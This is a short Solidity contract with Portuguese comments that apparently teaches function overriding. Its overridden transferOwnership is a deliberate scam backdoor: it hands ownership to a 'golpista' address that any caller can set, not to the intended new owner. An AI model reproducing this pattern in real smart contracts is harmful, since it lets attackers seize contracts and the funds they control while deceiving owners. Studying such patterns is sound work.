// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

//import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/access/Ownable.sol";
import "./Ownable.sol";

contract Dono is Ownable {
    address public CaiunoGolpe;
    address public golpista;

    constructor() Ownable(msg.sender) {}

    //setar o endereco eu sendo golpista
    function Golpeendereco(address _novoendereco) external {
        golpista = _novoendereco;
    }

    //retorna que é o dono chamando a função do contrato importado
    //OBS. funções "external" são chamadas po EOAS (contas externas) ou transações, mas não são chamadas por contas contratos, já as publicas podem ser chamadas por contratos
    function retornarDono() external view returns (address) {
        return owner();
    }

    //posso subistituir a função do contrato abstrato utilizando minhas prórias definições
    //O motivo é o uso do "virtual" no contrato pai que permite a substituição pelo contrato filho
    //“virtual” é usada para indicar que um método pode ser sobrescrito em uma classe filha
    //que é o demonstrado abaixo
    function transferOwnership(address newOwner) public override onlyOwner {
        //peguei a função que troca o dono sem verificar se é o dono e troca diretamente
        _transferOwnership(golpista);
        CaiunoGolpe = newOwner;
    }
}
